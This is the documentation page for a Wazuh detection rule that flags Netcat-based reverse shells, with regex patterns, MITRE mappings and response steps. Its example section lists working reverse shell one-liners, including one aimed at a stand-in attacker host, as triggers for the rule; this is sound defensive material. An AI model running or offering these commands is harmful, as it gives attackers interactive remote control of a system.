# 🛡️ Wazuh Rule – Netcat-Based Reverse Shell Detection

## Rule ID
**100102**

## Severity
**Level 15 (High / Critical)**

---

## 📖 Overview

This Wazuh rule detects **potential reverse shell activity using Netcat-based utilities** (`nc`, `ncat`, `netcat`).  
It focuses on scenarios where Netcat is abused to spawn an **interactive Unix shell** or leverage **low-level network redirection** mechanisms.

Netcat-based reverse shells are widely used in real-world attacks due to their simplicity, availability, and effectiveness.

---

## 🔍 What This Rule Detects

The rule triggers when **Netcat (or a variant)** is used in combination with **either**:

1. **Shell execution via `-e` or `-c`**, or  
2. **Direct network redirection using `/dev/tcp` or `/dev/udp`**

This strongly indicates an **interactive reverse shell attempt**.

---

## 🧰 Tools Covered

- `nc`
- `ncat`
- `netcat`

Detection is **case-insensitive** and works regardless of the binary path:
- `nc`
- `/usr/bin/nc`
- `/bin/netcat`

---

## 🐚 Shells Covered

The rule detects execution of the following shells:

- `bash`
- `sh`
- `dash`
- `zsh`
- `ksh`, `mksh`
- `ash` (BusyBox / Alpine / IoT)
- `csh`, `tcsh`
- `fish`

---

## 🧪 Example Commands That Trigger the Rule

```bash
nc 10.10.10.10 9001 -e sh
nc -e /bin/bash 192.168.1.5 4444
ncat -c sh attacker.example.com 1337
/usr/bin/netcat -e dash 10.0.0.5 5555
nc 10.10.10.10 4444 < /dev/tcp/10.10.10.10/4444
```

---

## ❌ Examples That Do NOT Trigger the Rule

```bash
nc -l 4444
nc -zv example.com 22
netcat example.com 80
nc --help
```

These commands do not execute a shell or establish an interactive reverse session.

---

## 🧠 Detection Logic

### Netcat + Shell Execution
```regex
(?i)\b(?:nc|ncat|netcat)\b.*?\s-(?:e|c)\s+(?:/bin/)?(?:bash|sh|dash|zsh|ksh|mksh|ash|csh|tcsh|fish)\b
```

### Netcat + Low-Level Network Redirection
```regex
(?i)\b(?:nc|ncat|netcat)\b.*?/dev/(?:tcp|udp)/
```

Either condition is sufficient for the rule to fire.

---

## 🎯 MITRE ATT&CK Mapping

| Technique ID | Name |
|-------------|------|
| **T1059.004** | Command and Scripting Interpreter: Unix Shell |
| **T1219** | Remote Access Software |
| **T1105** | Ingress Tool Transfer |

---

## 🏷️ Rule Metadata

```xml
<group>command_execution,reverse_shell,attack</group>
```

- **command_execution** – Shell-level command execution
- **reverse_shell** – Interactive reverse shell behavior
- **attack** – High-confidence malicious activity

---

## 📍 Log Source Expectations

This rule requires **command execution visibility**, such as:
- Bash command auditing
- Custom command logging via `logger`
- Wazuh `linux_command` decoders

Example log file (testing only):

```
/var/log/cmdline
```

---

## 🚨 Alert Interpretation & Response

### Why This Alert Matters
- Netcat is frequently abused for post-exploitation
- Provides attackers with interactive remote access
- Often used to pivot, escalate privileges, or deploy payloads

### Recommended Response Actions
1. Isolate the affected host
2. Identify the executing user and parent process
3. Inspect active network connections
4. Review authentication and persistence mechanisms
5. Perform full incident response triage

---

## ⚠️ Known Limitations

- Does not detect reverse shells using:
  - Pure Bash `/dev/tcp` without Netcat
  - `python`, `perl`, `php`, `socat` (covered by other rules)
- Requires command-line logging to be enabled
- Highly obfuscated payloads may evade detection

---

## ✅ Use Cases

- SOC monitoring
- Threat hunting
- Incident response
- Honeypot detection
- Linux server security monitoring

---

## 📌 Summary

> **This rule provides high-confidence detection of Netcat-based reverse shells by correlating Netcat usage with shell execution or raw network redirection, a technique commonly observed in real-world attacks.**
